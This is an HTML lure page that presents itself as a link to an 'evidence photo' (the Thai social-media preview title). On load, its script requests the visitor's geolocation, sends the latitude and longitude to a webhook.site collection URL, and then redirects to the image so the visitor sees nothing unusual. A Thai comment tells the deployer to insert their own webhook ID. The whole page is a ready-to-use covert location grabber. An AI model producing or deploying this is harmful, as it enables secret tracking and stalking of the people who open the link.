<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="ดูรูปภาพหลักฐาน">
    <meta property="og:image" content="https://rewat9888.github.io/upgraded-fishstick/evidence.jpg"> 
    <meta property="og:type" content="website">
    <title>Loading...</title>
</head>
<body onload="getLocation()">
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(s => {
                    // อย่าลืมเอาลิงก์ Webhook ของท่านมาใส่นะครับ
                    fetch(`https://webhook.site/YOUR-ID?lat=${s.coords.latitude}&lng=${s.coords.longitude}`);
                    setTimeout(go, 500);
                }, go);
            } else { go(); }
        }
        function go() { window.location.href = "evidence.jpg"; }
    </script>
</body>
</html>
